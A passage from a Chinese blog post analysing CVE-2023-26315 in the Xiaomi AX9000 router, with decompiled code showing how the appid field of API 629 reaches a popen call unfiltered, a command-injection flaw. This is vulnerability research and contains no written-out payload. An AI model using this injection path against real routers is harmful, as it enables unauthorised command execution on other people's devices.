<p>在<code>sub_1BAE0</code>函数中，创建了<code>socket</code>，传入的参数是<code>Json</code>字符串，很容易判断出此处会将<code>payload</code>字段的<code>Json</code>数据发送给本地<code>127.0.0.1</code>的<code>9090</code>端口<br><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/15.png"></p>
<p><code>/usr/sbin/datacenter</code>程序一直挂在进程中，监听着<code>9090</code>端口，故我们的数据被传到了<code>datacenter</code>程序进一步处理(这里笔者有一个疑问，不知道winmt师傅是如何发现这个 <code>datacenter</code> 程序监听9090端口，难不成是把 <code>sbin</code> 文件夹下所有文件都分析了一遍吗?)<br>从下图图示部分可以看到 <code>datacenter</code> 程序的main函数中创建了非阻塞服务器实例，监听9090端口<br><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/16.png"></p>
<p>下面进入到<code>datacenter</code>的<code>constructAPIMappingTable()</code>函数<br><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/17.png"></p>
<p>这三个函数都是API路由映射表构建函数，用于建立API编号 → 处理函数的映射关系，实现请求的路由分发<br>有一些<code>api</code>是直接在<code>datacenter</code>中被处理的，有些是被进一步转发到了<code>/usr/sbin/indexservice</code>（<code>9088</code>端口）处理，另外一些则是被转发到了<code>/usr/sbin/plugincenter</code>（<code>9091</code>端口）中进一步处理。</p>
<p>下面我们之间定位到漏洞所在的api，在<code>datacenter::PluginApiCollection::sConstructMappingTable</code>中，当<code>api</code>为<code>629</code>的时候，对应的<code>handler</code>是<code>callPluginCenter</code></p>
<p><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/18.png"></p>
<p>进入 <code>callPluginCenter</code> 看一下它的功能</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">callPluginCenter</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// x0</span></span><br><span class="line">  _BYTE v5[<span class="number">32</span>]; <span class="comment">// [xsp+38h] [xbp+38h] BYREF</span></span><br><span class="line">  _QWORD v6[<span class="number">5</span>]; <span class="comment">// [xsp+58h] [xbp+58h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = json_object_to_json_string(a1, &amp;_stack_chk_guard, <span class="number">0LL</span>);</span><br><span class="line">  sub_B48B0(v5, v3);</span><br><span class="line">  ThriftClient::sCallPluginCenter(v6, v5);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::_M_assign(a2, v6);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::_M_dispose(v6);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::_M_dispose(v5);</span><br><span class="line">  <span class="keyword">return</span> v6[<span class="number">4</span>] ^ _stack_chk_guard;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析可知它的主要功能是接收JSON格式的请求数据，通过<code>Thrift协议</code>转发到<code>plugincenter服务</code>，获取服务端响应并返回</p>
<p>进入其中的 <code>sCallPluginCenter</code> 函数可以看出它将数据转发给了本地的9091端口<br><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/19.png"></p>
<p>下面来看 <code>DataCenterHandler::request函数</code> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">DataCenterHandler::request</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v5; <span class="comment">// x0</span></span><br><span class="line">  __int64 v6; <span class="comment">// x2</span></span><br><span class="line">  __int64 v7; <span class="comment">// x0</span></span><br><span class="line">  _QWORD v9[<span class="number">6</span>]; <span class="comment">// [xsp+58h] [xbp+58h] BYREF</span></span><br><span class="line">  _QWORD v10[<span class="number">5</span>]; <span class="comment">// [xsp+88h] [xbp+88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  APIMapping::APIMapping(v9);</span><br><span class="line">  APIMapping::redirectRequest(v10, v9, a3);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::_M_assign(a2, v10);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::_M_dispose(v10);</span><br><span class="line">  <span class="built_in">std</span>::_Rb_tree&lt;<span class="type">int</span>,<span class="built_in">std</span>::<span class="built_in">pair</span>&lt;<span class="type">int</span> <span class="type">const</span>,<span class="type">void</span> (*)(json_object *,<span class="built_in">std</span>::<span class="built_in">string</span> &amp;)&gt;,<span class="built_in">std</span>::_Select1st&lt;<span class="built_in">std</span>::<span class="built_in">pair</span>&lt;<span class="type">int</span> <span class="type">const</span>,<span class="type">void</span> (*)(json_object *,<span class="built_in">std</span>::<span class="built_in">string</span> &amp;)&gt;&gt;,<span class="built_in">std</span>::less&lt;<span class="type">int</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="built_in">std</span>::<span class="built_in">pair</span>&lt;<span class="type">int</span> <span class="type">const</span>,<span class="type">void</span> (*)(json_object *,<span class="built_in">std</span>::<span class="built_in">string</span> &amp;)&gt;&gt;&gt;::_M_erase(</span><br><span class="line">    v9,</span><br><span class="line">    v9[<span class="number">2</span>]);</span><br><span class="line">  google::LogMessage::LogMessage(</span><br><span class="line">    v9,</span><br><span class="line">    <span class="string">&quot;src/thriftwrapper/DataCenterHandler.hpp&quot;</span>,</span><br><span class="line">    <span class="number">40LL</span>,</span><br><span class="line">    <span class="number">1LL</span>,</span><br><span class="line">    <span class="number">0LL</span>,</span><br><span class="line">    &amp;google::LogMessage::SendToSyslogAndLog,</span><br><span class="line">    <span class="number">0LL</span>);</span><br><span class="line">  v5 = google::LogMessage::stream(v9);</span><br><span class="line">  v7 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(v5, <span class="string">&quot;output is: &quot;</span>, v6);</span><br><span class="line">  <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="type">char</span>&gt;(v7, a2);</span><br><span class="line">  google::LogMessage::~LogMessage(v9);</span><br><span class="line">  <span class="keyword">return</span> v10[<span class="number">4</span>] ^ _stack_chk_guard;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中调用了 <code>APIMapping::APIMapping</code> 而这个函数里面就调用了我们之前分析的 <code>constructAPIMappingTable函数</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">APIMapping::APIMapping</span><span class="params">(APIMapping *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  *(this + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  *(this + <span class="number">2</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *(this + <span class="number">3</span>) = this + <span class="number">8</span>;</span><br><span class="line">  *(this + <span class="number">4</span>) = this + <span class="number">8</span>;</span><br><span class="line">  *(this + <span class="number">5</span>) = <span class="number">0LL</span>;</span><br><span class="line">  constructAPIMappingTable(this);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用<code>APIMapping::APIMapping</code>函数建立好上述的映射关系表后 <code>DataCenterHandler::request函数</code> 又调用了 <code>APIMapping::redirectRequest</code>函数。</p>
<p><code>APIMapping::redirectRequest</code>函数是我们需要重点分析的内容，它的主要作用简而言之就是<code>解析请求中的API编号，在STL map中查找对应的处理函数，然后通过函数指针动态调用</code><br><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20.png"></p>
<p>前面我们分析过了，当<code>api</code>为<code>629</code>时，传入的<code>payload</code>字段的数据会被转发给<code>plugincenter</code>程序处理<br>所以下面我们来分析 <code>/usr/sbin/plugincenter</code>程序</p>
<p>直接在<code>plugincenter</code>中找到 <code>datacenter::PluginApiMappingExtendCollection::sConstructMappingTable</code>函数<br>同样这个函数也是通过<code>map</code>建立<code>api</code>编号和对应<code>handler</code>函数的映射关系<br><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/21.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v3 = <span class="number">629</span>;</span><br><span class="line">*<span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="type">int</span>,<span class="type">void</span> (*)(json_object *,<span class="built_in">std</span>::<span class="built_in">string</span> &amp;)&gt;::operator[](a1, &amp;v3) = parseGetIdForVendor;</span><br></pre></td></tr></table></figure>

<p>可以得知当<code>api</code>编号为<code>629</code>的时候，会执行<code>parseGetIdForVendor</code>函数<br>进入<code>parseGetIdForVendor</code>函数中<br>会将传入的<code>Json</code>数据内的<code>appid</code>字段作为参数传递到<code>PluginApi::getIdForVendor</code>函数中<br><img src="/../picture/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/22.png"></p>
<p>下面来看 <code>PluginApi::getIdForVendor</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall PluginApi::getIdForVendor@&lt;X0&gt;(__int64 a1@&lt;X1&gt;, __int64 a2@&lt;X8&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// x0</span></span><br><span class="line">  __int64 v5; <span class="comment">// x0</span></span><br><span class="line">  __int64 JsonObject; <span class="comment">// x19</span></span><br><span class="line">  __int64 v7; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// x0</span></span><br><span class="line">  __int64 v10; <span class="comment">// [xsp+0h] [xbp+0h] BYREF</span></span><br><span class="line">  __int64 v11; <span class="comment">// [xsp+40h] [xbp+40h] BYREF</span></span><br><span class="line">  _BYTE v12[<span class="number">16</span>]; <span class="comment">// [xsp+48h] [xbp+48h] BYREF</span></span><br><span class="line">  _QWORD v13[<span class="number">2</span>]; <span class="comment">// [xsp+58h] [xbp+58h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [xsp+68h] [xbp+68h] BYREF</span></span><br><span class="line">  _BYTE v15[<span class="number">32</span>]; <span class="comment">// [xsp+78h] [xbp+78h] BYREF</span></span><br><span class="line"></span><br><span class="line">  AppAccountManager::AppAccountManager(&amp;v11);</span><br><span class="line">  <span class="keyword">if</span> ( !AppAccountManager::IsValidAppId(&amp;v11, a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    google::LogMessage::LogMessage(</span><br><span class="line">      v12,</span><br><span class="line">      <span class="string">&quot;src/api/PluginApi.cpp&quot;</span>,</span><br><span class="line">      <span class="number">626LL</span>,</span><br><span class="line">      <span class="number">2LL</span>,</span><br><span class="line">      <span class="number">0LL</span>,</span><br><span class="line">      &amp;google::LogMessage::SendToSyslogAndLog,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">    v4 = google::LogMessage::stream(v12);</span><br><span class="line">    <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(v4, <span class="string">&quot;invalid app id.&quot;</span>);</span><br><span class="line">    google::LogMessage::~LogMessage(v12);</span><br><span class="line">    sub_8A940(&amp;v10 + <span class="number">120</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( ApiBase::sCreateJsonObject(<span class="number">5LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (json_object_to_json_string)();</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::operator=(v15, v5);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::_M_dispose(v15);</span><br><span class="line">  &#125;</span><br><span class="line">  v13[<span class="number">0</span>] = &amp;v14;</span><br><span class="line">  v13[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::operator+&lt;<span class="type">char</span>&gt;(<span class="string">&quot;matool --method idForVendor --params &quot;</span>, a1);</span><br><span class="line">  CommonUtils::sCallSystem(v15, v13);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::_M_dispose(v15);</span><br><span class="line">  JsonObject = ApiBase::sCreateJsonObject(<span class="number">0LL</span>);</span><br><span class="line">  v7 = json_object_new_string(v13[<span class="number">0</span>]);</span><br><span class="line">  json_object_object_add(JsonObject, <span class="string">&quot;idforvendor&quot;</span>, v7);</span><br><span class="line">  v8 = json_object_to_json_string(JsonObject);</span><br><span class="line">  sub_8A940(a2, v8);</span><br><span class="line">  json_object_put(JsonObject);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::_M_dispose(v13);</span><br><span class="line">  AppAccountManager::~AppAccountManager(&amp;v11);</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析可以得知这个函数的主要作用应该是下面三点</p>
<ul>
<li>验证应用ID的有效性</li>
<li>通过系统命令调用外部工具获取供应商ID</li>
<li>将结果封装为JSON格式返回</li>
</ul>
<p>我们来一步步分析:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall PluginApi::getIdForVendor@&lt;X0&gt;(__int64 a1@&lt;X1&gt;, __int64 a2@&lt;X8&gt;)</span><br></pre></td></tr></table></figure>
<ul>
<li>a1: 输入参数，指向包含appid的字符串（应用程序ID）</li>
<li>a2: 输出参数，用于存储返回结果的字符串引用</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AppAccountManager::AppAccountManager(&amp;v11);</span><br></pre></td></tr></table></figure>
<p>在栈上构造一个<code>AppAccountManager</code>对象，用于验证应用ID的有效性</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !AppAccountManager::IsValidAppId(&amp;v11, a1) ) &#123; </span><br><span class="line">	<span class="comment">// 如果appid无效，执行这个代码块 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检查传入的appid是否合法,如果不合法将会进入if中<br>但是如果不合法则不会进入if中，但是很奇怪，尽管不合法也没有退出该函数阻止后面的命令执行，甚至没有对该appid的内容做一个过滤，而是做了一个日志记录，创建了一个错误响应，但是就是没有<code>return</code>，所以依旧会执行下面的代码</p>
<p>就在下面的代码中有这样一段代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v13[<span class="number">0</span>] = &amp;v14;</span><br><span class="line">v13[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">v14 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">std</span>::operator+&lt;<span class="type">char</span>&gt;(<span class="string">&quot;matool --method idForVendor --params &quot;</span>, a1);</span><br><span class="line">CommonUtils::sCallSystem(v15, v13);</span><br></pre></td></tr></table></figure>

<p>这句 <code>std::operator+&lt;char&gt;(&quot;matool --method idForVendor --params &quot;, a1);</code> (这里我猜测实际应该是 <code>std::operator+&lt;char&gt;(&quot;matool...&quot;, a1, v13);</code>而<code>v13</code>应该是被反编译的时候优化掉了，否则解释不了为什么会对<code>v13</code>产生影响)将 <code>v13</code> 变成了 <code>&quot;matool --method idForVendor --params &quot; + a1</code> 而 <code>a1</code> 则是用户可控的 <code>appid</code></p>
<p><code>sCallSystem</code>是一个封装的函数，用于执行命令，其中不是使用<code>system函数</code>而是使用<code>popen函数</code>来完成命令<br>但是 <code>sCallSystem</code> 并没有实现对命令参数安全性进行判断，也没有对不合理的指令做过滤，因此最终会导致用户可以控制 <code>appid</code> 来实现命令执行漏洞</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>最后做个小结吧。在复现漏洞的过程中，我发现其中涉及的 C++ 网络编程、红黑树等数据结构，都是自己目前的知识盲区，阅读时常常感到吃力。即便借助 AI 工具辅助，仍有不少细节未能吃透，这也导致漏洞原理分析部分存在疏漏，没能在文章中完全的表达清晰。同时，winmt 师傅的文章里还有不少让我困惑的地方。比如已知 sub_1BAE0 函数会向本地 127.0.0.1:9090 发送数据，但仍不清楚如何确认 datacenter 程序正监听该端口。在惊叹于 winmt 师傅深厚的漏洞挖掘功底时，我也清晰意识到自身的短板，由于缺乏系统的学习，只能在复现过程中边摸索边补漏。但多次的漏洞复现也让我更明确了后续努力的方向，希望通过持续积累逐步提升自己的漏洞挖掘能力。</p>
<p>参考<br><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-281901.htm">[原创] 小米AX9000路由器CVE-2023-26315漏洞挖掘-智能设备-看雪-安全社区|安全招聘|kanxue.com</a><br><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-282034.htm">[原创] 小米路由器固件仿真模拟方案-智能设备-看雪论坛-安全社区|非营利性质技术交流社区</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">XiDP</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/11/05/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">http://example.com/2025/11/05/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">XiDP</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/IOT/">IOT</a><a class="post-meta__tags" href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/">路由器</a><a class="post-meta__tags" href="/tags/%E5%B0%8F%E7%B1%B3/">小米</a></div><div class="post-share"><div class="social-share" data-image="/img/Qhead.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/07/14/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/" title="qemu搭建ARM64环境"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">qemu搭建ARM64环境</div></div><div class="info-2"><div class="info-item-1">前言懒得自己配的话可以直接下载, 配一下也需要好几个小时,怪麻烦的 通过网盘分享的文件：qemu_ARM64.rar链接: https://pan.baidu.com/s/1ypZnTVZUwUZQQK0Tnc9bew?pwd=xidp 提取码: xidp 所需前置准备创建磁盘文件并下载内核镜像、内存盘镜像文件 12345678qemu-img create -f qcow2 debian-3607-aarch64.qcow2 32Gwget http://ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/debian-installer/arm64/initrd.gzwget http://ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/debian-installer/arm64/linuxwget...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/06/14/DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/" title="DIR-815 栈溢出漏洞(CNVD-2013-11625)复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-14</div><div class="info-item-2">DIR-815 栈溢出漏洞(CNVD-2013-11625)复现</div></div><div class="info-2"><div class="info-item-1">复现环境及所需工具漏洞复现环境Ubuntu 24.04.2 LTS 基础工具配置基础的Pwn环境 + binwalk + sasquatch + qemupwn环境配置推荐YX-hueimie师傅的博客★pwn 24.04环境搭建保姆级教程★_ubuntu24 pwn-CSDN博客★pwn 22.04环境搭建保姆级教程★_pwn环境搭建-CSDN博客 安装binwalk可以直接使用apt安装，也可以下载binwalk的源码来自己编译 1sudo apt install binwalk  sasquatch 是binwalk用于解压非标准SquashFS文件系统的关键依赖(入门不安装这个那么我们之后binwalk分解固件会发现里面 squashfs-root 文件夹是空的)安装方法如下: 123456# 安装依赖库（关键步骤，否则编译会失败） sudo apt-get install build-essential zlib1g-dev liblzma-dev liblzo2-dev # 克隆仓库并编译 git clone...</div></div></div></a><a class="pagination-related" href="/2025/06/13/D-Link%20%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/" title="D-Link 登录信息泄露（权限绕过）漏洞分析报告（CVE-2018-7034）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-13</div><div class="info-item-2">D-Link 登录信息泄露（权限绕过）漏洞分析报告（CVE-2018-7034）</div></div><div class="info-2"><div class="info-item-1">前言漏洞编号CVE-2018-7034，影响D-Link和TrendNet的一些老设备。 通过网盘分享的文件：TEW751DR_FW103B03.bin链接: https://pan.baidu.com/s/1g37sSUnZQDQjpg_ABuGULg?pwd=xidp 提取码: xidp 这里分析的是TrendNet TEW751的固件，此外D-Link的一些老设备，如DIR645，DIR815等也都受该漏洞影响。 基础工具配置复现环境 Ubuntu 24.04.2 LTS 基础工具配置可以参考这篇文章中的配置: DIR-815 栈溢出漏洞(CNVD-2013-11625)复现-先知社区 漏洞分析存在漏洞的地方为 /squashfs-root/htdocs/web/getcfg.php  这里通过 $AUTHORIZED_GROUP 变量判断用户权限而 $GETCFG_SVC = cut($_POST[&quot;SERVICES&quot;], $SERVICE_INDEX, &quot;,&quot;); 中，$GETCFG_SVC 是通过 POST 传入的...</div></div></div></a><a class="pagination-related" href="/2025/07/12/CVE-2017-17215%20%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2017-17215 华为HG532路由器RCE漏洞复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-12</div><div class="info-item-2">CVE-2017-17215 华为HG532路由器RCE漏洞复现</div></div><div class="info-2"><div class="info-item-1">漏洞描述CVE-2017-17215是CheckPoint团队披露的远程命令执行（RCE）漏洞，存在于华为HG532路由器中。该设备支持名为DeviceUpgrade的一种服务类型，可通过向/ctrlt/DeviceUpgrade_1的地址提交请求，来执行固件的升级操作。可通过向37215端口发送数据包，启用UPnP协议服务，并利用该漏洞，在NewStatusURL或NewDownloadURL标签中注入任意命令以执行。 漏洞披露:https://research.checkpoint.com/2017/good-zero-day-skiddie/ 附件下载:通过网盘分享的文件：HG532eV100R001C02B015_upgrade_main.bin链接: https://pan.baidu.com/s/1r9fkxyNBKFhvu0uDRKzElg?pwd=xidp 提取码: xidp 漏洞分析根据官方的漏洞报告，我们知道漏洞存在于/bin/upnp二进制文件按照官方报告中提到的 NewStatusURL 或 NewDownloadURL...</div></div></div></a><a class="pagination-related" href="/2025/07/13/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="IOT入门--路由器命令执行漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-13</div><div class="info-item-2">IOT入门--路由器命令执行漏洞</div></div><div class="info-2"><div class="info-item-1">D-Link DI_8100命令执行漏洞复现所需工具Burp Suite​​-Linux下载BurpSuite v2024.10汉化无cmd框版（2024.11.03更新） - 吾爱破解 - 52pojie.cn 配置Burp Suite​​教程Burp Suite代理和火狐浏览器的设置(超详细)_burpsuite firefox-CSDN博客 固件下载地址:http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-8100 漏洞分析使用binwalk对固件进行分解 1binwalk -Me DI_8100-16.07.26A1.trx   查看一下系统架构以及保护  下面使用FirmAE对固件进行仿真进入FirmAE工具文件夹下，使用 run.sh 来进行启动 1sudo ./run.sh -d dlink &lt;DI_8100-16.07.26A1.trx的路径&gt;   选择2进入终端，然后使用ps命令查看进程我们发现程序启动之后 jhttpd 这个服务就启动了，所以我们主要的程序就是这个 jhttpd...</div></div></div></a><a class="pagination-related" href="/2025/07/14/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/" title="qemu搭建ARM64环境"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-14</div><div class="info-item-2">qemu搭建ARM64环境</div></div><div class="info-2"><div class="info-item-1">前言懒得自己配的话可以直接下载, 配一下也需要好几个小时,怪麻烦的 通过网盘分享的文件：qemu_ARM64.rar链接: https://pan.baidu.com/s/1ypZnTVZUwUZQQK0Tnc9bew?pwd=xidp 提取码: xidp 所需前置准备创建磁盘文件并下载内核镜像、内存盘镜像文件 12345678qemu-img create -f qcow2 